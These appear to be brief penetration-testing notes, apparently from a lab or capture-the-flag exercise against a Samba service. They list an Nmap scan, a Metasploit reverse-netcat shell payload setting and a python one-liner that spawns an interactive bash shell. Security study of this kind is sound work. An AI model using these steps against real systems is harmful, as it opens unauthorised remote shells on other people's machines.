Look for a vuln in Samba
Run Nmap
$ set PAYLOAD cmd/unix/reverse_netcat
python -c 'import pty;pty.spawn("/bin/bash")'
